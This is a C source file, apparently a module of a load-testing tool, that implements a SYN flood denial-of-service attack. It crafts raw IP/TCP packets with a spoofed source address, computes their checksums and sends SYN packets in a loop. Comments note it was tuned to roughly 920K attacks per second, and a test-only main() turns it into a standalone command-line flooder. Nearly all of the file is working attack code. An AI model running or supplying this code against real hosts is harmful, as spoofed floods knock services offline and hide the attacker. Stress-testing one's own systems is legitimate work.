/*************************************************************************************************************************

Progarm: ns_dos_syn_attack (Syn Flood DOS with LINUX sockets)
Purpose: To simulate the Syn Flood DOS attack
Date:08/09/2011

*************************************************************************************************************************/

#include "ns_dos_attack_includes.h"
#include "ns_dos_syn_attack.h"
#include "ns_dos_attack_reporting.h"
#include "../ns_group_data.h"

char *command = NULL;

//This function will check header checksum
static unsigned short csum(unsigned short *ptr,int nbytes) {
  NSDL1_SOCKETS(NULL,NULL, "Method called: nbytes = %d", nbytes);
  register long sum;
  unsigned short oddbyte;
  register short answer;

  sum=0;
  while(nbytes>1) {
    sum+=*ptr++;
    nbytes-=2;
  }
  if(nbytes==1) {
    oddbyte=0;
    *((u_char*)&oddbyte)=*(u_char*)ptr;
    sum+=oddbyte;
  }

  sum = (sum>>16)+(sum & 0xffff);
  sum = sum + (sum>>16);
  answer=(short)~sum;

  NSDL1_SOCKETS(NULL,NULL, "Method End.");
  return(answer);
}


//This function will set the ip header
static void setup_ip_header(struct iphdr *iph, char *source_ip_add){
  NSDL1_SOCKETS(NULL,NULL, "Method called: source_ip_add = %s", source_ip_add);
  iph->ihl = 5;
  iph->version = 4;
  iph->tos = 0;
  //iph->tot_len = sizeof (struct iphdr) + sizeof (struct tcphdr) + sizeof("Hello"); //Manish 
  iph->tot_len = sizeof (struct ip) + sizeof (struct tcphdr);
  iph->id = htonl (54321); //Id of this packet
  iph->frag_off = 0;
  iph->ttl = 255; // Manish : we can also assign "MAXTTL"
  iph->protocol = IPPROTO_TCP; // upper layer protocol, TCP
  iph->check = 0;      //Set to 0 before calculating checksum
  iph->saddr = inet_addr (source_ip_add);  //Spoof the source ip address
  NSDL1_SOCKETS(NULL,NULL, "Method End.");
}

//This function will set the tcp header 
static int setup_tcp_header(struct tcphdr *tcph, unsigned short dest_port){
  long pnum;
  unsigned short pn;
  
  NSDL1_SOCKETS(NULL,NULL, "Method called: dest_port = %hu", dest_port);
  pnum = random();
  pn = pnum%64000;
  pn += 1024;
  tcph->source = htons (pn);
  NSDL2_SOCKETS(NULL,NULL, "Method called: source_port(tcph->source) = %hu", tcph->source);
  tcph->dest = htons (dest_port);
  tcph->seq = 0;
  tcph->ack_seq = 0;
  tcph->doff = 5;      /* first and only tcp segment */
  tcph->fin=0;
  tcph->syn=1;
  tcph->rst=0;
  tcph->psh=0;
  tcph->ack=0;
  tcph->urg=0;
  tcph->window = htons (5840); /* maximum allowed window size */
  tcph->check = 0;/* if you set a checksum to zero, your kernel's IP stack
                   should fill in the correct checksum during transmission */
  tcph->urg_ptr = 0;
  NSDL1_SOCKETS(NULL,NULL, "Method End.");

  return pn;
}


//This function will be called by netstorm (it is like a main method)
void ns_dos_syn_attack_ext(VUser *vptr, char *source_ip_add, char *dest_ip_add, unsigned short dest_port, int num_attack){

  NSDL1_SOCKETS(NULL,NULL, "Method called: source_ip_add = %s, dest_ip_add = %s, dest_port = %hu, num_attack = %d",source_ip_add, dest_ip_add, dest_port, num_attack);

  char datagram[MAX_PACKET_SIZE]; //Datagram to represent the packet
  struct iphdr *iph; //IP header
  struct tcphdr *tcph; //TCP header
  //char *msg; //Manish: for sending msg
  struct sockaddr_in sin;
  struct pseudo_header psh;
  int i;
  int socket_fd ;
  char src_port_str[10], dest_port_str[10]; // Needed for event log

  sprintf(src_port_str, "%hu", 0);
  sprintf(dest_port_str, "%hu", dest_port);

  
  NSDL2_SOCKETS(NULL,NULL, "src_port_str = %s, dest_port_str = %s",src_port_str, dest_port_str);

  //Initializ the above varibles
  iph = (struct iphdr *) datagram; 
  tcph = (struct tcphdr *) (datagram + sizeof (struct iphdr));
  //msg = datagram + (sizeof (struct iphdr) + sizeof (struct tcphdr)); 

  //create a Raw Socket
  socket_fd = socket (PF_INET, SOCK_RAW, IPPROTO_TCP);
  if (socket_fd < 0){
    NS_EL_4_ATTR(EID_DOS_ATTACK, vptr->user_index,
                                 vptr->sess_inst, EVENT_CORE, EVENT_MAJOR,
                                 source_ip_add, src_port_str, dest_ip_add, dest_port_str,
                                 "Error in creating raw socket. Error = %s", strerror(errno));
    INC_DOS_SYNC_ATTACK_NUM_ERR_COUNTERS(vptr);
    return;
  }

  //optimized code - number of attacks 
  //We have put the core content(minus the sendto command ) out of the for loop
  //As a result we have scaled the number of attacks/sec from 880K to 920K attacks.
    sin.sin_family = AF_INET;
    sin.sin_port = htons(dest_port);
    sin.sin_addr.s_addr = inet_addr(dest_ip_add); //destination IP address

    memset (datagram, 0, MAX_PACKET_SIZE); /* zero out the buffer */

    //Set appropriate fields in header
     setup_ip_header(iph,source_ip_add); // Spoof IP is here
     iph->daddr = sin.sin_addr.s_addr;
     iph->check = csum ((unsigned short *) datagram, iph->tot_len >> 1);
     int src_port = setup_tcp_header(tcph, dest_port);
     sprintf(src_port_str, "%hu", src_port);
    
   //Now the IP checksum
     psh.source_address = inet_addr(source_ip_add);
     psh.dest_address = sin.sin_addr.s_addr;
     psh.placeholder = 0;
     psh.protocol = IPPROTO_TCP;
     psh.tcp_length = htons(20);
     memcpy(&psh.tcp , tcph , sizeof (struct tcphdr));
     tcph->check = csum( (unsigned short*) &psh , sizeof (struct pseudo_header));
    
    /* a IP_HDRINCL call, to make sure that the kernel knows
       the header is included in the data, and doesn't insert
       its own header into the packet before our data 
    */

    int one = 1;
    const int *val = &one;
    // TODO: Check if this can be moved out of loop
    if (setsockopt (socket_fd, IPPROTO_IP, IP_HDRINCL, val, sizeof (one)) < 0) {
         NS_EL_4_ATTR(EID_DOS_ATTACK, vptr->user_index,
         vptr->sess_inst, EVENT_CORE, EVENT_MAJOR,
         source_ip_add, src_port_str, dest_ip_add, dest_port_str,
        "Error in setsockopt(IP_HDRINCL). Error = %s", strerror(errno));
                                                                                                                                                                                            dos_attack_avgtime->dos_syn_attacks_num_err++; // Increament number of error attacks
                                                                                                                                                                                            goto clean_up;
                                                                                                                                                                                         }

  NSDL2_SOCKETS(NULL,NULL, "num_attack = %d", num_attack);
  for (i=0; i < num_attack; i++){
    //Send the packet
    if (sendto (socket_fd,                          /* our socket */
                datagram,                   /* the buffer containing headers and data */
                iph->tot_len,               /* total length of our datagram */
                0,                          /* routing flags, normally always 0 */
                (struct sockaddr *) &sin,   /* socket addr, just like in */
                 sizeof (sin)) < 0)         /* a normal send() */
    {
      NS_EL_4_ATTR(EID_DOS_ATTACK, vptr->user_index,
                                 vptr->sess_inst, EVENT_CORE, EVENT_MAJOR,
                                 source_ip_add, src_port_str, dest_ip_add, dest_port_str,
                                 "Error in sending datagram packet. Error = %s", strerror(errno));
      INC_DOS_SYNC_ATTACK_NUM_ERR_COUNTERS(vptr);
    }
    else
    {
      INC_DOS_SYNC_ATTACK_NUM_SUCC_COUNTERS(vptr);
      NSDL2_SOCKETS(NULL,NULL, "TCP SYN succefully sent.");
    }
  }

clean_up:
  if(close(socket_fd) < 0){
    {
      NS_EL_4_ATTR(EID_DOS_ATTACK, vptr->user_index,
                                 vptr->sess_inst, EVENT_CORE, EVENT_MAJOR,
                                 source_ip_add, src_port_str, dest_ip_add, dest_port_str,
                                 "Error in closing packet. Error = %s", strerror(errno));
    }
  }
  NSDL2_SOCKETS(NULL,NULL, "Method End.");
}


void Usage(void)
{
  fprintf(stdout, "Usage: %s -s <source ip address> -d <destnation ip address> -p <destination port> -i <number of attack>\n", command);
  exit(1);
}

#ifdef TEST
int main(int argc, char *argv[]){
  char source_ip_add[sizeof "255.255.255.255"];
  char dest_ip_add[sizeof "255.255.255.255"];
  unsigned short dest_port;
  int num_attack = 10; //default 
  int opt;

  command = argv[0];

  while ((opt = getopt(argc, argv, "s:d:p:i:")) != -1) {
    switch (opt) {
      case 's':
        strcpy(source_ip_add, optarg);
        break;
      case 'd':
        strcpy(dest_ip_add, optarg);
        break;
      case 'p':
        dest_port = atoi(optarg);
        break;
       case 'i':
        num_attack = atoi(optarg);
        break;
      default:
        Usage();
        exit(EXIT_FAILURE);
    }
  }
 
  printf("main():--\n\tsource_ip_add = %s\n\tdest_ip_add = %s\n\tdest_port = %hu\n",source_ip_add, dest_ip_add,dest_port); 

  NSDL1_SOCKETS(NULL,NULL, "Method called: source_ip_add = %s, dest_ip_add = %s, dest_port = %hu",source_ip_add, dest_ip_add,dest_port);
  ns_dos_syn_attack_ext(source_ip_add, dest_ip_add, dest_port, num_attack);  
  
  return 0; //Success 
}
#endif
